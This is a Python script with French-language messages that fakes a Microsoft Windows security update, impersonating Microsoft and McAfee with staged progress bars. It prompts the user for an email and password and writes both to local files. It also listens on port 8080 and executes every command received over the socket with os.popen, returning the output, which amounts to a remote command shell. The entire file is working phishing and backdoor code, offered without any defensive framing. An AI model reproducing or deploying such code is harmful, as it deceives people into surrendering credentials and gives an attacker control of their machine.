import socket
import os
import time
import sys
import subprocess

HOST = '127.0.0.1'
PORT = 8080

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()

    conn, addr = s.accept()

    print("Connection établie avec l'attaquant {}".format(addr))

    print("Microsoft Windows [Version 10.0.32648.1578]")
    print("(c) Microsoft Corporation. Tous droits réservés.")
    print()
    print()
    print("Message /!\: Une mise à jour de votre système de pare-feu est en cours. Veuillez laisser votre système actif afin de permettre la finalisation de celle-ci.")
    
    print("Initialisation du système d'exploitation Windows Coorporation")
    print()
    print("Mise à jour : 1%")
    time.sleep(2)
    print()
    print("Windows Security Téléchargement des paquets : 5%")
    time.sleep(2)
    print()
    print("Windows Security Téléchargement des paquets : 10%")
    time.sleep(1)
    print()
    print("Windows Security Téléchargement des paquets : 23%")
    time.sleep(3)
    print()
    print("Windows Security Téléchargement des paquets : 35%")
    time.sleep(2)
    print()
    print("Windows Security Téléchargement des paquets : 58%")
    time.sleep(2)
    print()
    print("Windows Security Téléchargement des paquets : 64%")
    time.sleep(2)
    print()
    print("Windows Security Téléchargement des paquets : 79%")
    time.sleep(0.5)
    print()
    print("Windows Security Téléchargement des paquets : 82%")
    time.sleep(2)
    print()
    print("Windows Security Téléchargement des paquets : 95%")
    time.sleep(2)
    print()
    print("Windows Security Téléchargement des paquets : 98%")
    time.sleep(1)
    print()
    print("Windows Security Téléchargement des paquets : 99%")
    time.sleep(3)
    print()
    print("Windows Security Téléchargement des paquets : 100%")
    time.sleep(2)
    print()
    print("Windows Coorporation a été installé avec succès !")
    print("\n")

    time.sleep(2)
    print("[!] La connexion au service du système de sécurité est en cours...")
    time.sleep(2)
  
    password = input("Entrer votre email : ")
    with open("email.txt", "w") as f:
        f.write("L'email est : {}".format(password))
        
    email = input("Entrez votre password pour verfier votre identité : ")
    with open("password.txt", "w") as e:
        e.write("Le password est : {}".format(email))
        os.system("start http://127.0.0.1:5500/windows.html")
        print()
        print("L'antivirus McAfee est maintenant activé sur votre ordinateur. Merci pour votre coopération")
        print()
        print("Signed by Microsoft Coporation.")



    while True:
        data = conn.recv(1024)
        if not data:
            break

        command = data.decode().strip()
        output = os.popen(command).read()
        conn.sendall(output.encode())

        




